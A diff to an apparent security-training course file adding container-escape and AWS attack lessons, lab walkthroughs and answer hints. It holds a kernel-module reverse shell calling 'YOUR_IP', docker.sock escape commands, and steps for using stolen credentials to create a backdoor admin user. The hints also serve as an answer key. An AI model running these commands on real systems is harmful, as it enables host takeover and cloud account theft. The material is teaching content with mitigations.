@@ -4,57 +4,85 @@
   "tasks": {
     "1": {
       "title": "Container escape",
+      "body": "## Escape techniques by priority\n\n### 1. --privileged (the open door)\n\n```bash\n# If the container runs with --privileged:\nfdisk -l                          # you see ALL the host's disks\nmount /dev/sda1 /mnt              # mount the host filesystem\nchroot /mnt                       # you're root on the host\n```\n\n### 2. Mounted docker socket\n\nIf `/var/run/docker.sock` is accessible inside the container, you can control\nthe HOST's Docker daemon:\n\n```bash\n# Inside the container:\nls -la /var/run/docker.sock        # does it exist?\n\n# If it exists: create a new container with the host FS mounted\ndocker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host\n```\n\n### 3. Excessive capabilities\n\n```bash\n# Inside the container: what caps do I have?\ncapsh --print\n\n# CAP_SYS_MODULE → load a kernel module:\ncat > /tmp/reverse.c << 'EOF'\n#include <linux/kmod.h>\nstatic int __init init(void){ system(\"nc -e /bin/bash YOUR_IP 4444\"); return 0; }\nmodule_init(init);\nEOF\ninsmod /tmp/reverse.ko             # shell on the HOST\n```\n\n### 4. Namespace breakout (hostPID, hostNetwork)\n\nIf the container shares the PID namespace with the host (`--pid=host`), you can inject\ncode into host processes via `/proc/<pid>/root`.\n\n### 5. Kernel exploits\n\nThe container shares the host's kernel. DirtyPipe, DirtyCow, etc. work\nfrom inside the container against the host.\n\n## Your escape checklist\n\n```bash\n# Inside the compromised container:\nid                                   # are you root inside?\ncat /proc/self/status | grep Cap     # what capabilities?\nls /var/run/docker.sock              # docker socket?\ncat /proc/1/cgroup                   # host cgroup or container cgroup?\nls /host /var/run/secrets/kubernetes.io  # host mounts?\nfind / -name \"*.env\" -o -name \"id_rsa\" 2>/dev/null  # secrets?\n```",
       "questions": {
         "containers-y-cloud-t01-q01": {
-          "prompt": "What docker flag gives ALL host privileges?"
+          "prompt": "What docker flag gives ALL host privileges?",
+          "hint": "--privileged"
         },
         "containers-y-cloud-t01-q02": {
-          "prompt": "What UNIX socket allows container creation?"
+          "prompt": "What UNIX socket allows container creation?",
+          "hint": "/var/run/docker.sock"
         },
         "containers-y-cloud-t01-q03": {
-          "prompt": "What capability allows kernel module loading?"
+          "prompt": "What capability allows kernel module loading?",
+          "hint": "CAP_SYS_MODULE",
+          "options": {
+            "a": "CAP_NET_BIND_SERVICE",
+            "b": "CAP_SYS_MODULE — can insmod a malicious kernel module",
+            "c": "CAP_CHOWN",
+            "d": "CAP_FOWNER"
+          }
         }
       }
     },
     "2": {
       "title": "IAM misconfig",
+      "body": "## After SSRF: the pivot to the cloud\n\nYou already know SSRF can reach `169.254.169.254` to steal IAM credentials. What do you\ndo WITH those credentials?\n\n```bash\n# Configure the stolen credentials\nexport AWS_ACCESS_KEY_ID=ASIA...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...\n\n# Enumerate: who am I?\naws sts get-caller-identity\n\n# What can I do?\naws iam list-attached-user-policies\naws iam list-roles\n\n# Any S3 buckets?\naws s3 ls\naws s3 ls s3://empresa-datos-sensibles/\naws s3 cp s3://empresa-datos-sensibles/credenciales.txt .\n\n# Secrets Manager?\naws secretsmanager list-secrets\naws secretsmanager get-secret-value --secret-id production/db\n\n# Can I create new users (persistence)?\naws iam create-user --user-name backdoor\naws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\n## The misconfigurations you'll ALWAYS find\n\n| Misconfig | Impact | Detection command |\n|---|---|---|\n| **Public S3** | data leak | `aws s3api get-bucket-acl --bucket NAME` |\n| **Over-permissioned IAM role** | privilege escalation | `aws iam simulate-principal-policy` |\n| **Lambda with secrets in env** | credential exposure | `aws lambda get-function-configuration` |\n| **Security Group 0.0.0.0/0** | exposure | `aws ec2 describe-security-groups` |\n| **Public EBS snapshot** | disk theft | `aws ec2 describe-snapshots --owner-ids self` |\n| **CloudTrail disabled** | no logs | `aws cloudtrail describe-trails` |\n\n## Pivot: from instance to full domain\n\n```text\nSSRF → metadata → IAM creds → S3 (data) → lambda (persistence)\n                                      → EC2 (new instance with its own key)\n                                      → IAM (create admin user)\n                                      → the ENTIRE AWS account\n```\n\nIn Azure/GCP it's similar: the metadata endpoint hands out Managed Identity tokens that\ncan authenticate against Azure AD → Graph API → every resource.",
       "questions": {
         "containers-y-cloud-t02-q01": {
-          "prompt": "What AWS CLI command lists S3 buckets?"
+          "prompt": "What AWS CLI command lists S3 buckets?",
+          "hint": "aws s3 ls"
         },
         "containers-y-cloud-t02-q02": {
-          "prompt": "What env var provides IAM credentials to EC2?"
+          "prompt": "After stealing the role's temporary credentials from IMDS, which environment variable holds the access key (the one starting with ASIA)?",
+          "hint": "The three variables in the example: the access key, the secret and the session token. You want the first one."
         },
         "containers-y-cloud-t02-q03": {
-          "prompt": "What S3 misconfig is the most common data leak?"
+          "prompt": "What S3 misconfig is the most common data leak?",
+          "hint": "Public bucket without authentication.",
+          "options": {
+            "a": "Encryption disabled",
+            "b": "Public S3 bucket (public-read) — anyone on the internet can list/download it",
+            "c": "Old API version",
+            "d": "Mistagged resources"
+          }
         }
       }
     },
     "3": {
       "title": "Lab: escape through the docker.sock",
+      "body": "## From the socket to the host\n\nBring up the lab and get in:\n\n```bash\ncd labs/container-escape-lab && cp flags.env.example flags.env\ndocker compose --env-file flags.env up -d\ndocker exec -it lab-container-escape-shell-1 sh\n```\n\nThe original sin: someone mounted `/var/run/docker.sock` \"for CI\". The\nsocket IS the docker CLI: whoever talks to it IS root on the host. And\ntalking to it is just HTTP:\n\n```sh\n# 1. Recon — does this control the host?\ncurl -s --unix-socket /var/run/docker.sock http://localhost/version\n\n# 2. What's running out there?\ncurl -s --unix-socket /var/run/docker.sock http://localhost/containers/json\n\n# 3. The full escape:\ncurl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"Image\":\"alpine\",\"Cmd\":[\"cat\",\"/flag/host-secret.txt\"],\n       \"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host\"]}}'\n\n# 4. Start it and read:\ncurl -s --unix-socket /var/run/docker.sock -X POST http://containers/<id>/start\ncurl -s --unix-socket /var/run/docker.sock http://localhost/containers/<id>/logs\n```\n\n`Privileged: true` + `Binds: [\"/:/host\"]` = a container that IS the host\nunder a different name. From its shell: `chroot /host sh` and you're root on\nthe physical machine.\n\n(In the lab, the daemon on the other side is simulated — the technique and every\nHTTP call are real. The lab README covers the defense.)\n\n## Variants of the same bug\n\n- `--privileged` on the container (no socket needed): open caps\n  allow loading kernel modules or mapping /dev/sda.\n- A loose SYS_MODULE cap: `insmod` your own LKM → kernel pwned.\n- Writable `/proc/sysrq-trigger` or cgroup release_agent.\n\nThe ordered mitigation: don't mount the socket (a read-only socket-proxy if\nthere's no other way), cap_drop ALL + no-new-privileges ALWAYS, a runtime\nsandbox (gVisor/Kata) for anything untrusted, and never `--privileged`\nbecause \"the pipeline needed it\".",
       "questions": {
         "containers-y-cloud-t03-q01": {
-          "prompt": "Inside the lab container, confirm via /version that /var/run/docker.sock controls the HOST daemon. Submit the recon flag."
+          "prompt": "Inside the lab container, confirm via /version that /var/run/docker.sock controls the HOST daemon. Submit the recon flag.",
+          "hint": "curl -s --unix-socket /var/run/docker.sock http://localhost/version"
         },
         "containers-y-cloud-t03-q02": {
-          "prompt": "Create a privileged container binding the host / via the socket API. Submit the flag from the Warnings."
+          "prompt": "Create a privileged container binding the host / via the socket API. Submit the flag from the Warnings.",
+          "hint": "POST /containers/create with HostConfig: Privileged=true and Binds [/:/host] — send the correct spec first"
         },
         "containers-y-cloud-t03-q03": {
-          "prompt": "Start your escape container and read its logs: you just read a host file. Submit the final flag."
+          "prompt": "Start your escape container and read its logs: you just read a host file. Submit the final flag.",
+          "hint": "POST /containers/<id>/start (expect 204) and GET /containers/<id>/logs"
         }
       }
     },
     "4": {
       "title": "Lab: rob the cloud via IMDS, S3 and IAM",
+      "body": "## The cloud's sinful trio\n\nBring up the room's second lab (its commands are in its own folder):\n\n```bash\ncd labs/cloud-iam-sim && cp flags.env.example flags.env\ndocker compose --env-file flags.env up -d\n# http://127.0.0.1:18115\n```\n\n### 1. IMDS: the endpoint that gives away the role\n\nEvery EC2 instance exposes `http://169.254.169.254/latest/meta-data/`\n(link-local, WITHOUT authentication). That's where the instance role's temporary\ncredentials live. Any SSRF in the app scoops them up:\n\n```bash\n# In real AWS (from the instance or via SSRF):\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-web-role\n\n# In the lab (same paths under /aws):\ncurl http://127.0.0.1:18115/aws/latest/meta-data/iam/security-credentials/ec2-web-role\n```\n\nLook at the lab's `Expiration`: 2036. The 2019 Capital One breach\nwas EXACTLY this — a WAF with SSRF + IMDSv1 + an oversized role.\n\n**Mitigation**: IMDSv2 with a mandatory token (PUT hop-limit 1),\nand minimal roles per service.\n\n### 2. The public bucket\n\n```bash\ncurl -s http://127.0.0.1:18115/s3/buckets | jq '.buckets[] | select(.public)'\ncurl -s http://127.0.0.1:18115/s3/corp-internal-tools/terraform.tfstate | jq .\n```\n\nThe `tfstate` carries secret access keys and plaintext passwords (terraform\nonly encrypts them if you set `encrypted: true` — nobody does it in time).\nPublic buckets with tfstate/logs/backups are the #1 finding in any\ncloud pentest.\n\n### 3. The wildcard that allows everything\n\n```bash\ncurl -s http://127.0.0.1:18115/iam/policies | jq .\n```\n\n`\"Action\": \"*\"` on `\"Resource\": \"*\"` attached to an instance role:\nchain it with the IMDS creds and you own the whole account (aws s3 ls\nover EVERYTHING, iam createUser, etc.). Least privilege isn't\nbureaucracy: it's the wall that turns a minor SSRF into a \"we have to\nrotate the whole account\" incident.\n\n## The real chain\n\nSSRF (web) → IMDS (creds) → IAM (wildcard) → S3 (all the data). Four\nchainable failures that together are the most common cloud breach pattern\nsince 2019. Cut ANY link and the attack dies: that's why all four get\npatched, not just \"the SSRF bug\".",
       "questions": {
         "containers-y-cloud-t04-q01": {
-          "prompt": "The workload exposes its metadata. Get the role credentials via IMDS and submit the flag."
+          "prompt": "The workload exposes its metadata. Get the role credentials via IMDS and submit the flag.",
+          "hint": "curl http://127.0.0.1:18115/aws/latest/meta-data/iam/security-credentials/ec2-web-role — the real path is http://169.254.169.254/..."
         },
         "containers-y-cloud-t04-q02": {
-          "prompt": "One bucket is public. Pull terraform.tfstate (or secrets.env) and submit the flag inside."
+          "prompt": "One bucket is public. Pull terraform.tfstate (or secrets.env) and submit the flag inside.",
+          "hint": "curl http://127.0.0.1:18115/s3/buckets → the public one is corp-internal-tools → /s3/corp-internal-tools/terraform.tfstate"
         },
         "containers-y-cloud-t04-q03": {
-          "prompt": "Audit /iam/policies: one has Action * on Resource *. Submit its flag."
+          "prompt": "Audit /iam/policies: one has Action * on Resource *. Submit its flag.",
+          "hint": "curl http://127.0.0.1:18115/iam/policies"
         }
       }
     }
